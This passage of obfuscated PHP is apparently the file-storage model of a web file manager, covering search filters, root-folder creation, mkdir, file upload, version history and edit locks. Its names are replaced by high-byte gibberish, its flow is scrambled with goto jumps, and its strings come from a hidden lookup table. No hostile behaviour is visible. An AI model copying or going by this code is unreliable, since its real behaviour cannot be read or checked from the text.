(!strstr($c¨áõ¥¯à[$d‘’¢«•Ö“[178]], $d‘’¢«•Ö“[57] . $e’ŸÔå²œ­[$d‘’¢«•Ö“[413]] . $d‘’¢«•Ö“[57])) { return !1; } } if (isset($e’ŸÔå²œ­[$d‘’¢«•Ö“[1936]]) && $e’ŸÔå²œ­[$d‘’¢«•Ö“[1936]] < $c¨áõ¥¯à[$d‘’¢«•Ö“[88]]) { return !1; } if (isset($e’ŸÔå²œ­[$d‘’¢«•Ö“[1937]]) && $e’ŸÔå²œ­[$d‘’¢«•Ö“[1937]] > $c¨áõ¥¯à[$d‘’¢«•Ö“[88]]) { return !1; } goto d¡öÆñ‚¡Í; d¡öÆñ‚¡Í: if (isset($e’ŸÔå²œ­[$d‘’¢«•Ö“[570]]) && $e’ŸÔå²œ­[$d‘’¢«•Ö“[570]] != $c¨áõ¥¯à[$d‘’¢«•Ö“[442]]) { return !1; } return !0; goto EñŒí—ñ£µ; Eïª©Îôø: $d‘’¢«•Ö“ =& $_SERVER[£¶ä½¶¢]; $E¨„Ì–ŞÃæ = $c¨áõ¥¯à[$d‘’¢«•Ö“[411]] == $d‘’¢«•Ö“[97]; if (!strstr($c¨áõ¥¯à[$d‘’¢«•Ö“[495]], $d‘’¢«•Ö“[57] . $e’ŸÔå²œ­[$d‘’¢«•Ö“[486]] . $d‘’¢«•Ö“[57])) { return !1; } goto F”ˆßµŠ‰; EñŒí—ñ£µ: } public function listSearchChildren($dÉ­²¤†¦, $d£‘İ¶¯ãİ = 5000) { goto AĞÄ§ÁÇ’; AĞÄ§ÁÇ’: $eÌĞ‰³Øéš =& $_SERVER[£¶ä½¶¢]; $E¶ëøÌ²Ë = array(); $Aò•½§†‚ = $this->sourceInfo($dÉ­²¤†¦); goto B«äíªæí; B«äíªæí: $BÜé£‡±÷ = array($eÌĞ‰³Øéš[495] => array($eÌĞ‰³Øéš[388], $Aò•½§†‚[$eÌĞ‰³Øéš[495]] . $Aò•½§†‚[$eÌĞ‰³Øéš[403]] . $eÌĞ‰³Øéš[521])); $E®×‡°Ëå = $this->field($eÌĞ‰³Øéš[403])->cache(null, 600)->where($BÜé£‡±÷)->count(); if ($E®×‡°Ëå > $d£‘İ¶¯ãİ) { return $this->_listSearchChildrenNear($dÉ­²¤†¦, $d£‘İ¶¯ãİ); } goto bŠÖç®®¶ô; bŠÖç®®¶ô: $AŒ¸¦Ê«ïº = $this->field($eÌĞ‰³Øéš[403])->where($BÜé£‡±÷)->select(); $E¶ëøÌ²Ë = array_to_keyvalue($AŒ¸¦Ê«ïº, $eÌĞ‰³Øéš[43], $eÌĞ‰³Øéš[403]); return $E¶ëøÌ²Ë; goto C¨ÎŠáƒ; C¨ÎŠáƒ: } private function _listSearchChildrenNear($A«êºŠ§Ãö, $E©­×ÃĞÊ) { goto CÄ–öíİì¼; Eêò„ßİä: $b÷öŠïöİÖ = $this->field($C½çíÊ§‹†[1938])->where($Aøõ£ªÆò£)->select(); $Aƒ°¢½ØÌ™ = array_to_keyvalue(array_filter_by_field($b÷öŠïöİÖ, $C½çíÊ§‹†[411], $C½çíÊ§‹†[97]), $C½çíÊ§‹†[43], $C½çíÊ§‹†[403]); $cÊ†‘Ğ½¯Ë = array_merge($cÊ†‘Ğ½¯Ë, array_to_keyvalue($b÷öŠïöİÖ, $C½çíÊ§‹†[43], $C½çíÊ§‹†[403])); goto b‡äÉïÄøˆ; CÄ–öíİì¼: $C½çíÊ§‹† =& $_SERVER[£¶ä½¶¢]; $cÊ†‘Ğ½¯Ë = array(); $Aøõ£ªÆò£ = array($C½çíÊ§‹†[486] => $A«êºŠ§Ãö); goto Eêò„ßİä; C·ĞÛøÆ™ƒ: $cÊ†‘Ğ½¯Ë = array_merge($cÊ†‘Ğ½¯Ë, array_to_keyvalue($b÷öŠïöİÖ, $C½çíÊ§‹†[43], $C½çíÊ§‹†[403])); $cÊ†‘Ğ½¯Ë = array_slice($cÊ†‘Ğ½¯Ë, 0, $E©­×ÃĞÊ); return $cÊ†‘Ğ½¯Ë; goto añĞÒ¶›ëÎ; b‡äÉïÄøˆ: if (!$Aƒ°¢½ØÌ™) { return $cÊ†‘Ğ½¯Ë; } $Aøõ£ªÆò£ = array($C½çíÊ§‹†[486] => array($C½çíÊ§‹†[17], $Aƒ°¢½ØÌ™)); $b÷öŠïöİÖ = $this->field($C½çíÊ§‹†[1938])->where($Aøõ£ªÆò£)->limit($E©­×ÃĞÊ)->select(); goto C·ĞÛøÆ™ƒ; añĞÒ¶›ëÎ: } private function _listSearchBindPinyin($f±›ÁÖ‘¡æ, &$C’âĞ‡ã»À, &$DİåÃöèÑÚ) { goto bÔ‘¢î¶¤; bÔ‘¢î¶¤: $A„í›©Õƒ° =& $_SERVER[£¶ä½¶¢]; if (!isset($f±›ÁÖ‘¡æ[$A„í›©Õƒ°[1773]]) || !$f±›ÁÖ‘¡æ[$A„í›©Õƒ°[1773]]) { return; } if (!Input::check($f±›ÁÖ‘¡æ[$A„í›©Õƒ°[1773]], $A„í›©Õƒ°[325]) || strlen($f±›ÁÖ‘¡æ[$A„í›©Õƒ°[1773]]) < 2) { return; } goto E©Á£ÄÙ·’; AÔñÌÄØİä: $C’âĞ‡ã»À = $eÊ¨Ô¿„¬; goto dèõ¸°«Ô; eÖÔ“ëï’: $DİåÃöèÑÚ = $A„í›©Õƒ°[1940] . str_replace($A„í›©Õƒ°[57], $A„í›©Õƒ°[1941], $DİåÃöèÑÚ); $d¨¥ã’¾Ä„ = $C’âĞ‡ã»À[$A„í›©Õƒ°[38]]; unset($C’âĞ‡ã»À[$A„í›©Õƒ°[38]]); goto b›—¸Ï®Ö; E©Á£ÄÙ·’: $B‹¿»‹Ã¢ = "\114\105\x46\124\x20\112\x4f\111\116\x20{$this->tablePrefix}\x69\157\x5f\x73\157\x75\162\x63\x65\137\155\x65\x74\x61\x20\155\x65\164\141\40\157\156\40\163\157\x75\162\x63\x65\x2e\163\157\x75\162\x63\x65\x49\x44\x20\75\40\155\x65\x74\141\x2e\163\157\165\x72\143\x65\x49\104"; $eÊ¨Ô¿„¬ = array(); $DİåÃöèÑÚ = str_replace(array($A„í›©Õƒ°[9], $A„í›©Õƒ°[60], $A„í›©Õƒ°[1939]), $A„í›©Õƒ°[43], $DİåÃöèÑÚ); goto eÖÔ“ëï’; b›—¸Ï®Ö: foreach ($C’âĞ‡ã»À as $C—§›ãº => $B³®àÈª·¡) { $eÊ¨Ô¿„¬[$A„í›©Õƒ°[1940] . $C—§›ãº] = $B³®àÈª·¡; } foreach ($d¨¥ã’¾Ä„ as $bÅŸÖ¢ÓÅˆ) { $eÊ¨Ô¿„¬[] = array($A„í›©Õƒ°[1942] => $bÅŸÖ¢ÓÅˆ, $A„í›©Õƒ°[955] => $A„í›©Õƒ°[1777], array($A„í›©Õƒ°[1943] => $bÅŸÖ¢ÓÅˆ, $A„í›©Õƒ°[1944] => array($A„í›©Õƒ°[17], array($A„í›©Õƒ°[452], $A„í›©Õƒ°[451])))); } $this->join($B‹¿»‹Ã¢); goto AÔñÌÄØİä; dèõ¸°«Ô: } private function _parseSearchWhere($e·¸š”Å) { goto BÅ£ÚÊ™×Â; BÅ£ÚÊ™×Â: $f¼‡öøĞ¯ =& $_SERVER[£¶ä½¶¢]; $aĞ‰êô—’ô = array(); if (isset($e·¸š”Å[$f¼‡öøĞ¯[729]]) && $e·¸š”Å[$f¼‡öøĞ¯[729]]) { $aĞ‰êô—’ô[$f¼‡öøĞ¯[94]] = array($f¼‡öøĞ¯[1945], $e·¸š”Å[$f¼‡öøĞ¯[729]]); } goto bÒÙªù¬Ê©; A‹ùœ›ĞÏš: if (isset($e·¸š”Å[$f¼‡öøĞ¯[570]]) && $e·¸š”Å[$f¼‡öøĞ¯[570]]) { $aĞ‰êô—’ô[] = array($f¼‡öøĞ¯[442] => $e·¸š”Å[$f¼‡öøĞ¯[570]], $f¼‡öøĞ¯[440] => $e·¸š”Å[$f¼‡öøĞ¯[570]], $f¼‡öøĞ¯[955] => $f¼‡öøĞ¯[1777]); } if (isset($e·¸š”Å[$f¼‡öøĞ¯[413]]) && $e·¸š”Å[$f¼‡öøĞ¯[413]]) { $fİ“çêßÑÄ = $e·¸š”Å[$f¼‡öøĞ¯[413]]; if ($fİ“çêßÑÄ == $f¼‡öøĞ¯[87]) { $aĞ‰êô—’ô[$f¼‡öøĞ¯[411]] = 1; } else { if ($fİ“çêßÑÄ == $f¼‡öøĞ¯[1948]) { $aĞ‰êô—’ô[$f¼‡öøĞ¯[411]] = 0; } else { if ($fİ“çêßÑÄ) { $fİ“çêßÑÄ = is_array($fİ“çêßÑÄ) ? $fİ“çêßÑÄ : explode($f¼‡öøĞ¯[57], $fİ“çêßÑÄ); $aĞ‰êô—’ô[$f¼‡öøĞ¯[413]] = array($f¼‡öøĞ¯[419], $fİ“çêßÑÄ); $aĞ‰êô—’ô[$f¼‡öøĞ¯[411]] = 0; } } } } if (isset($e·¸š”Å[$f¼‡öøĞ¯[486]]) && $e·¸š”Å[$f¼‡öøĞ¯[486]]) { $D¡¡Ù¨Ä©è = $this->sourceInfo($e·¸š”Å[$f¼‡öøĞ¯[486]]); $aĞ‰êô—’ô[$f¼‡öøĞ¯[561]] = array($f¼‡öøĞ¯[520], $D¡¡Ù¨Ä©è[$f¼‡öøĞ¯[495]] . $e·¸š”Å[$f¼‡öøĞ¯[486]] . $f¼‡öøĞ¯[521]); } goto eÄîË«Á–”; eÄîË«Á–”: if (isset($e·¸š”Å[$f¼‡öøĞ¯[1773]]) && trim($e·¸š”Å[$f¼‡öøĞ¯[1773]])) { $dõĞ„“Œ¨´ = trim($e·¸š”Å[$f¼‡öøĞ¯[1773]]); $f¸¿¡ÄÑºÆ = explode($f¼‡öøĞ¯[60], $dõĞ„“Œ¨´); if (strlen($dõĞ„“Œ¨´) > 2 && (substr($dõĞ„“Œ¨´, 0, 1) == $f¼‡öøĞ¯[126] && substr($dõĞ„“Œ¨´, -1) == $f¼‡öøĞ¯[126]) || substr($dõĞ„“Œ¨´, 0, 1) == $f¼‡öøĞ¯[65] && substr($dõĞ„“Œ¨´, -1) == $f¼‡öøĞ¯[65]) { $dõĞ„“Œ¨´ = substr($dõĞ„“Œ¨´, 1, -1); $f¸¿¡ÄÑºÆ = array($dõĞ„“Œ¨´); } $aĞ‰êô—’ô[$f¼‡öøĞ¯[38]] = array(array($f¼‡öøĞ¯[520], $f¼‡öøĞ¯[1775] . $dõĞ„“Œ¨´ . $f¼‡öøĞ¯[1775])); if (count($f¸¿¡ÄÑºÆ) > 1) { $aĞ‰êô—’ô[$f¼‡öøĞ¯[38]] = array(); foreach ($f¸¿¡ÄÑºÆ as $EÂÏÔ®¨™ß) { if (!trim($EÂÏÔ®¨™ß)) { continue; } $aĞ‰êô—’ô[$f¼‡öøĞ¯[38]][] = array($f¼‡öøĞ¯[520], $f¼‡öøĞ¯[1775] . trim($EÂÏÔ®¨™ß) . $f¼‡öøĞ¯[1775]); } } } return $aĞ‰êô—’ô; goto b÷õÉêİ‹È; bÒÙªù¬Ê©: if (isset($e·¸š”Å[$f¼‡öøĞ¯[484]]) && $e·¸š”Å[$f¼‡öøĞ¯[484]]) { $eñ¯Â™®¸œ = array($f¼‡öøĞ¯[1946], $e·¸š”Å[$f¼‡öøĞ¯[484]]); if ($aĞ‰êô—’ô[$f¼‡öøĞ¯[94]]) { $aĞ‰êô—’ô[$f¼‡öøĞ¯[94]] = array($aĞ‰êô—’ô[$f¼‡öøĞ¯[94]], $eñ¯Â™®¸œ, $f¼‡öøĞ¯[1947]); } else { $aĞ‰êô—’ô[$f¼‡öøĞ¯[94]] = $eñ¯Â™®¸œ; } } if (isset($e·¸š”Å[$f¼‡öøĞ¯[1936]]) && $e·¸š”Å[$f¼‡öøĞ¯[1936]] > 0) { $aĞ‰êô—’ô[$f¼‡öøĞ¯[88]] = array($f¼‡öøĞ¯[1945], $e·¸š”Å[$f¼‡öøĞ¯[1936]]); } if (isset($e·¸š”Å[$f¼‡öøĞ¯[1937]]) && $e·¸š”Å[$f¼‡öøĞ¯[1937]]) { $eñ¯Â™®¸œ = array($f¼‡öøĞ¯[1946], $e·¸š”Å[$f¼‡öøĞ¯[1937]]); if ($aĞ‰êô—’ô[$f¼‡öøĞ¯[88]]) { $aĞ‰êô—’ô[$f¼‡öøĞ¯[88]] = array($aĞ‰êô—’ô[$f¼‡öøĞ¯[88]], $eñ¯Â™®¸œ, $f¼‡öøĞ¯[1947]); } else { $aĞ‰êô—’ô[$f¼‡öøĞ¯[88]] = $eñ¯Â™®¸œ; } } goto A‹ùœ›ĞÏš; b÷õÉêİ‹È: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($C¸ÎÜ²Öô) { $F‡¨‰ğ½ª± =& $_SERVER[£¶ä½¶¢]; $cÍÂˆ‘†¾Â = Model($F‡¨‰ğ½ª±[510])->where(array($F‡¨‰ğ½ª±[1518] => $C¸ÎÜ²Öô))->find(); $C±¨Õñˆ¤ = $this->_mkdirRoot(SourceModel::TYPE_USER, $C¸ÎÜ²Öô, $cÍÂˆ‘†¾Â[$F‡¨‰ğ½ª±[38]]); $this->userDesktopAdd($C±¨Õñˆ¤); return $C±¨Õñˆ¤; } public function userDesktopAdd($Fõ‹Ç¹¯¹) { $c¬•’â§Ü =& $_SERVER[£¶ä½¶¢]; $Aœ¢Ò ¢œ« = LNG($c¬•’â§Ü[1949]); $eÁà™ù½À³ = $this->mkdir($Fõ‹Ç¹¯¹, $Aœ¢Ò ¢œ«); $this->metaSet($eÁà™ù½À³, $c¬•’â§Ü[1950], $c¬•’â§Ü[97]); $this->metaSet($Fõ‹Ç¹¯¹, $c¬•’â§Ü[1951], $eÁà™ù½À³); } public function groupRootAdd($CéŒˆ¾œñ) { $aÙº°³‡Ê­ =& $_SERVER[£¶ä½¶¢]; $f¹©—“œà‚ = Model($aÙº°³‡Ê­[494])->where(array($aÙº°³‡Ê­[1768] => $CéŒˆ¾œñ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $CéŒˆ¾œñ, $f¹©—“œà‚[$aÙº°³‡Ê­[38]]); } public function systemRootPathAdd($AÌ†ŠÙÁ×) { if ($AÌ†ŠÙÁ× != $_SERVER[£¶ä½¶¢][513]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $AÌ†ŠÙÁ×); } public function userRootRemove($fğØè¥ô¨Ñ) { $c¢Ü‰‹ò­ = $this->sourceRoot(SourceModel::TYPE_USER, $fğØè¥ô¨Ñ); if (!$c¢Ü‰‹ò­) { return; } $this->remove($c¢Ü‰‹ò­, !1); } public function groupRootRemove($EÊø„‡ÜëØ) { $EÛ÷ƒä§‹† = $this->sourceRoot(SourceModel::TYPE_GROUP, $EÊø„‡ÜëØ); if (!$EÛ÷ƒä§‹†) { return; } $this->remove($EÛ÷ƒä§‹†, !1); } private function _mkdirRoot($dà¬µ¦è¦Í, $A±¾µ„–Š›, $f™¬Ğ²ÏÀ†) { goto C·½İÅé§õ; D¥¶¯Ïäµ’: $Fè–Ñ¿§ƒ… = "\x4d\x6f\144\x65\x6c\x53\x6f\x75\x72\x63\145\56\x6d\153\x64\151\x72\122\x6f\157\164\56{$dà¬µ¦è¦Í}\56{$A±¾µ„–Š›}\56" . $f™¬Ğ²ÏÀ†; CacheLock::lock($Fè–Ñ¿§ƒ…); $B¾ë¯¸ÄÒ[$cĞĞòŒÛ[38]] = $f™¬Ğ²ÏÀ†; goto fšêÇÎŠù†; Aêš¼¿Ò²´: CacheLock::unlock($Fè–Ñ¿§ƒ…); return $Aí¯¼è†áæ; goto a•¬øÛàï; fšêÇÎŠù†: $Aí¯¼è†áæ = $this->add($B¾ë¯¸ÄÒ); $aæª£˜‹Ú† = array($cĞĞòŒÛ[563] => short_id($Aí¯¼è†áæ)); $this->where(array($cĞĞòŒÛ[418] => $Aí¯¼è†áæ))->save($aæª£˜‹Ú†); goto Aêš¼¿Ò²´; C·½İÅé§õ: $cĞĞòŒÛ =& $_SERVER[£¶ä½¶¢]; $B¾ë¯¸ÄÒ = array($cĞĞòŒÛ[402] => 0, $cĞĞòŒÛ[557] => $dà¬µ¦è¦Í, $cĞĞòŒÛ[558] => $A±¾µ„–Š›, $cĞĞòŒÛ[554] => 1, $cĞĞòŒÛ[559] => USER_ID, $cĞĞòŒÛ[560] => USER_ID, $cĞĞòŒÛ[555] => $cĞĞòŒÛ[43], $cĞĞòŒÛ[561] => $cĞĞòŒÛ[506], $cĞĞòŒÛ[430] => 0, $cĞĞòŒÛ[556] => 0, $cĞĞòŒÛ[456] => 0, $cĞĞòŒÛ[562] => $cĞĞòŒÛ[43]); if ($c‘ƒä‰˜´ª = $this->where($B¾ë¯¸ÄÒ)->find()) { return $c‘ƒä‰˜´ª[$cĞĞòŒÛ[403]]; } goto D¥¶¯Ïäµ’; a•¬øÛàï: } private function sourceRoot($Cì‘àØª‘‘, $døÀ‘İó‡î, $Bœ·—ììë÷ = false) { $B¨µì¯§ƒ =& $_SERVER[£¶ä½¶¢]; $E²¯°ŠˆØó = array($B¨µì¯§ƒ[402] => 0, $B¨µì¯§ƒ[557] => $Cì‘àØª‘‘, $B¨µì¯§ƒ[558] => $døÀ‘İó‡î); if ($c£æÃ³‰Å = $this->where($E²¯°ŠˆØó)->find()) { return $Bœ·—ììë÷ ? $c£æÃ³‰Å : $c£æÃ³‰Å[$B¨µì¯§ƒ[403]]; } return !1; } public function sourceRootGroup($CÀÏ˜ ßÈ) { goto fÁóÜßîá; fÁóÜßîá: $E„œö¿Ùæ´ =& $_SERVER[£¶ä½¶¢]; if (is_string($CÀÏ˜ ßÈ)) { $CÀÏ˜ ßÈ = array($CÀÏ˜ ßÈ); } $e«»¥…ß˜Ò = array($E„œö¿Ùæ´[402] => 0, $E„œö¿Ùæ´[557] => SourceModel::TYPE_GROUP, $E„œö¿Ùæ´[558] => array($E„œö¿Ùæ´[17], $CÀÏ˜ ßÈ)); goto E¼¸ä¾ğ«ï; E¼¸ä¾ğ«ï: $this->selectPageReset(); $c˜½…Âµš… = $this->listSource($e«»¥…ß˜Ò, 1000); $this->selectPageRestore(); goto eß¬¨ÓÆ†™; eß¬¨ÓÆ†™: return array_to_keyvalue($c˜½…Âµš…[$E„œö¿Ùæ´[85]], $E„œö¿Ùæ´[492]); goto BÅ’ò½›; BÅ’ò½›: } public function mkfile($f«ãíàƒƒÊ, $fÄŒšÈÓ‹Â, $a›¾öÛˆ÷â = '', $EÛÓêë×Éƒ = REPEAT_RENAME) { $Eàåîªî«Ó =& $_SERVER[£¶ä½¶¢]; $dÚ²È²Ç” = Model($Eàåîªî«Ó[579])->addFileByContent($a›¾öÛˆ÷â, $fÄŒšÈÓ‹Â); return $this->_createFileCall($f«ãíàƒƒÊ, $fÄŒšÈÓ‹Â, $dÚ²È²Ç”, $EÛÓêë×Éƒ, $Eàåîªî«Ó[1213]); } public function addFile($DÔ¨½ÀÒÍ, $BºÜÈÉÌ‰, $C®ÜæãÒî¼, $c¨Òæ‰ÔÅ = false, $BÆ’•øËñ“ = REPEAT_RENAME) { $CÓãÊ§¸ = Model($_SERVER[£¶ä½¶¢][579])->addFile($BºÜÈÉÌ‰, $C®ÜæãÒî¼, $c¨Òæ‰ÔÅ); return $this->_createFileCall($DÔ¨½ÀÒÍ, $C®ÜæãÒî¼, $CÓãÊ§¸, $BÆ’•øËñ“); } public function addFileByFileID($fó²† ¦¶È, $Dª¸•·×œ±, $aö‡ˆ¦ğàˆ, $e«Ç‡ÚÛİ = REPEAT_RENAME) { $FÑÌ³‚öÔ =& $_SERVER[£¶ä½¶¢]; $EİÏóÕîÌ× = Model($FÑÌ³‚öÔ[579])->find($Dª¸•·×œ±); Model($FÑÌ³‚öÔ[579])->linkAdd($Dª¸•·×œ±); return $this->_createFileCall($fó²† ¦¶È, $aö‡ˆ¦ğàˆ, $EİÏóÕîÌ×, $e«Ç‡ÚÛİ); } public function addFileByRemote($eŠ¬­‘æÈî, $B—ÈÒã¡˜©, $e‘·ğ†´ÅÙ, $fíë›‘Ší = array(), $aÌ«†¹¢±¤ = REPEAT_RENAME) { $eŠâ¨‘Ùùİ = Model($_SERVER[£¶ä½¶¢][579])->addFileByRemote($B—ÈÒã¡˜©, $e‘·ğ†´ÅÙ, $fíë›‘Ší); return $this->_createFileCall($eŠ¬­‘æÈî, $e‘·ğ†´ÅÙ, $eŠâ¨‘Ùùİ, $aÌ«†¹¢±¤); } private function _createFileCall($aÒ‹à­Àô«, $BÑÏ§ÚƒÕ, $cš®Œ¯å½–, $AßÓé˜ˆ¨Œ, $B×îÊè´…Ÿ = "\x75\x70\x6c\x6f\x61\144") { goto Fô¼íß’åñ; Fô¼íß’åñ: $a¶–‹­á¡Š =& $_SERVER[£¶ä½¶¢]; $f±‡ÌºÙÎ = !1; $this->lockWriteStart($aÒ‹à­Àô«, $BÑÏ§ÚƒÕ); goto BŞŒñ«´µ; E‡Ä»ÛÆ: if ($f±‡ÌºÙÎ && $C›á‹ƒ‹¡º && $C›á‹ƒ‹¡º != $bšèŞ˜â) { Model($a¶–‹­á¡Š[1920])->eventCreate($C›á‹ƒ‹¡º, $B×îÊè´…Ÿ); } $this->lockWriteEnd($aÒ‹à­Àô«, $BÑÏ§ÚƒÕ); return $C›á‹ƒ‹¡º; goto BùŠº«óŠ‘; BŞŒñ«´µ: $bšèŞ˜â = $this->fileNameExist($aÒ‹à­Àô«, $BÑÏ§ÚƒÕ); $C›á‹ƒ‹¡º = $this->_createFile($aÒ‹à­Àô«, $BÑÏ§ÚƒÕ, $cš®Œ¯å½–, $AßÓé˜ˆ¨Œ, $f±‡ÌºÙÎ); if (!$f±‡ÌºÙÎ) { Model($a¶–‹­á¡Š[458])->remove($cš®Œ¯å½–[$a¶–‹­á¡Š[455]]); } goto E‡Ä»ÛÆ; BùŠº«óŠ‘: } public function mkdir($F¯İ’Ï–Ø, $aŒœ­£ƒø, $Dää¹Œñù = REPEAT_SKIP) { goto d“šš ; Cä©Õ¦ÜÊ—: return $DŒæ†Ê¦™; goto BŒŒì×ìª®; e½Ãßº³æ‰: $this->lockWriteStart($F¯İ’Ï–Ø, $aŒœ­£ƒø); if ($Dää¹Œñù !== !1) { $a¼šîÇë‰ = $this->fileNameExist($F¯İ’Ï–Ø, $aŒœ­£ƒø); if ($a¼šîÇë‰ && $Dää¹Œñù != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($F¯İ’Ï–Ø, $aŒœ­£ƒø); return $a¼šîÇë‰; } $aŒœ­£ƒø = $this->fileNameAuto($F¯İ’Ï–Ø, $aŒœ­£ƒø, $Dää¹Œñù); } $C ¦ƒîŸÙÚ = array($A‡’¤¬å„ó[554] => 1, $A‡’¤¬å„ó[421] => $aŒœ­£ƒø, $A‡’¤¬å„ó[555] => $A‡’¤¬å„ó[43], $A‡’¤¬å„ó[456] => 0, $A‡’¤¬å„ó[556] => 0); goto dÙ”¯ŸÜ„; dÙ”¯ŸÜ„: $DŒæ†Ê¦™ = $this->_addSoure($C ¦ƒîŸÙÚ, $C‚¶ã¯); Model($A‡’¤¬å„ó[1920])->eventCreate($DŒæ†Ê¦™, $A‡’¤¬å„ó[1214]); $this->lockWriteEnd($F¯İ’Ï–Ø, $aŒœ­£ƒø); goto Cä©Õ¦ÜÊ—; d“šš : $A‡’¤¬å„ó =& $_SERVER[£¶ä½¶¢]; $C‚¶ã¯ = $this->sourceInfo($F¯İ’Ï–Ø); if (!$C‚¶ã¯) { return !1; } goto e½Ãßº³æ‰; BŒŒì×ìª®: } private function _createFile($dÖŸã²¹Íø, $Dïç©ö¼, $E¯ÑŒÁæÙç, $CŸòˆ„ØŠ, &$dƒ¥ òô†) { goto CÒºø²ˆµ¨; CÒºø²ˆµ¨: $A©¦¥Ş¾‰’ =& $_SERVER[£¶ä½¶¢]; $Dª Ç‰ÏÌğ = $this->sourceInfo($dÖŸã²¹Íø); if (!$E¯ÑŒÁæÙç || !$Dª Ç‰ÏÌğ) { return !1; } goto Fˆòå–™Ê¿; Eùß©ë‚Ç¯: $Eß¬Ûêõèœ = array($A©¦¥Ş¾‰’[554] => 0, $A©¦¥Ş¾‰’[421] => $Dïç©ö¼, $A©¦¥Ş¾‰’[555] => substr(get_path_ext($Dïç©ö¼), 0, 10), $A©¦¥Ş¾‰’[456] => $E¯ÑŒÁæÙç[$A©¦¥Ş¾‰’[455]], $A©¦¥Ş¾‰’[556] => $E¯ÑŒÁæÙç[$A©¦¥Ş¾‰’[88]]); $Fƒ‘¨ÌƒŒ· = $this->_addSoure($Eß¬Ûêõèœ, $Dª Ç‰ÏÌğ); $this->folderSizeReset($dÖŸã²¹Íø, intval($Eß¬Ûêõèœ[$A©¦¥Ş¾‰’[88]])); goto e‡£µšêÏ°; Fˆòå–™Ê¿: if ($CŸòˆ„ØŠ !== !1) { $d´¦È…¦ØŞ = $this->fileNameExist($dÖŸã²¹Íø, $Dïç©ö¼); } $dƒ¥ òô† = !0; if ($CŸòˆ„ØŠ && $d´¦È…¦ØŞ) { if ($CŸòˆ„ØŠ == REPEAT_SKIP) { $dƒ¥ òô† = !1; return $d´¦È…¦ØŞ; } else { if ($CŸòˆ„ØŠ == REPEAT_REPLACE) { $D‹‡—“„‚ = $this->sourceInfo($d´¦È…¦ØŞ); $FâîÊËò­ = $this->fileHistory($D‹‡—“„‚, $E¯ÑŒÁæÙç[$A©¦¥Ş¾‰’[455]], $E¯ÑŒÁæÙç[$A©¦¥Ş¾‰’[88]]); if (!$FâîÊËò­) { $dƒ¥ òô† = !1; } else { $this->folderSizeReset($dÖŸã²¹Íø); } return $d´¦È…¦ØŞ; } else { $Dïç©ö¼ = $this->fileNameAuto($dÖŸã²¹Íø, $Dïç©ö¼, $CŸòˆ„ØŠ, !1); } } } goto Eùß©ë‚Ç¯; e‡£µšêÏ°: return $Fƒ‘¨ÌƒŒ·; goto BùÜØ½Íâ©; BùÜØ½Íâ©: } protected function fileHistory($F¸™¡±ë, $BÌİ—®™Éš, $C†õä¥³) { goto f¬†˜¦Ü; cÇ¯‹—¶™³: Model($eŠ ù¹¡Úœ[1952])->addHistory($F¸™¡±ë); $f¥²…çè‹º = array($eŠ ù¹¡Úœ[560] => USER_ID, $eŠ ù¹¡Úœ[425] => time(), $eŠ ù¹¡Úœ[455] => $BÌİ—®™Éš, $eŠ ù¹¡Úœ[88] => $C†õä¥³); $this->where(array($eŠ ù¹¡Úœ[418] => $F¸™¡±ë[$eŠ ù¹¡Úœ[403]]))->save($f¥²…çè‹º); goto f…§ò’âƒ¯; f¬†˜¦Ü: $eŠ ù¹¡Úœ =& $_SERVER[£¶ä½¶¢]; if ($F¸™¡±ë[$eŠ ù¹¡Úœ[455]] == $BÌİ—®™Éš) { return !1; } $this->checkLock($F¸™¡±ë[$eŠ ù¹¡Úœ[403]], $BÌİ—®™Éš); goto cÇ¯‹—¶™³; f…§ò’âƒ¯: $this->sourceCacheClear($F¸™¡±ë[$eŠ ù¹¡Úœ[403]]); return !0; goto Bî‘Â¸±‘Õ; Bî‘Â¸±‘Õ: } public function checkLock($eóš­ï’ÜÙ, $bÙïö‚ˆ¯×) { goto Eöæ¹¾¦; Fîù©ŸùÀ®: $this->_createFileCall($cõº‰è…Âİ[$cé»Ó­¤µ¡[486]], $e‡©¥†½º, $eÏ…ìîğ•µ, REPEAT_REPLACE, $cé»Ó­¤µ¡[1213]); $a°ï«ïÈÄ¢ = $cõº‰è…Âİ[$cé»Ó­¤µ¡[453]][$cé»Ó­¤µ¡[518]]; $CğÖ¾Ê«÷ = $a°ï«ïÈÄ¢[$cé»Ó­¤µ¡[1954]] ? $a°ï«ïÈÄ¢[$cé»Ó­¤µ¡[1954]] : $a°ï«ïÈÄ¢[$cé»Ó­¤µ¡[38]]; goto EÍ‡¬ÁÃí‹; bÔÄÈ¾ Õ½: $fÅö‘êËÓ¢ = Session::get($cé»Ó­¤µ¡[1953]); $e‡©¥†½º = substr($cõº‰è…Âİ[$cé»Ó­¤µ¡[38]], 0, -1 - strlen($cõº‰è…Âİ[$cé»Ó­¤µ¡[178]])) . $cé»Ó­¤µ¡[1479] . $fÅö‘êËÓ¢ . $cé»Ó­¤µ¡[105] . $cõº‰è…Âİ[$cé»Ó­¤µ¡[178]]; $eÏ…ìîğ•µ = Model($cé»Ó­¤µ¡[579])->find($bÙïö‚ˆ¯×); goto Fîù©ŸùÀ®; EÍ‡¬ÁÃí‹: show_json(LNG($cé»Ó­¤µ¡[1955]) . $cé»Ó­¤µ¡[1956] . LNG($cé»Ó­¤µ¡[1957]) . $cé»Ó­¤µ¡[1958] . $CğÖ¾Ê«÷ . $cé»Ó­¤µ¡[1959], !1); goto D•İá¹‘Ğš; Eöæ¹¾¦: $cé»Ó­¤µ¡ =& $_SERVER[£¶ä½¶¢]; $cõº‰è…Âİ = $this->pathInfo($eóš­ï’ÜÙ); if (!$this->fileIsLock($cõº‰è…Âİ, !0)) { return; } goto bÔÄÈ¾ Õ½; D•İá¹‘Ğš: } public function fileIsLock($F„Ê¹˜‚Á, $cù†ƒ¿©è = false) { goto eñ™ò¤ŞÖÖ; b¼Éîã•ºÍ: $FÔÏÌµ = $GLOBALS[$Eà»ßÂÜÁ[16]][$Eà»ßÂÜÁ[98]][$Eà»ßÂÜÁ[516]]; if ($F„Ê¹˜‚Á[$Eà»ßÂÜÁ[453]][$Eà»ßÂÜÁ[517]] <= time() - $FÔÏÌµ) { $this->metaSet($F„Ê¹˜‚Á[$Eà»ßÂÜÁ[403]], $Eà»ßÂÜÁ[515], null); $this->metaSet($F„Ê¹˜‚Á[$Eà»ßÂÜÁ[403]], $Eà»ßÂÜÁ[517], null); } if 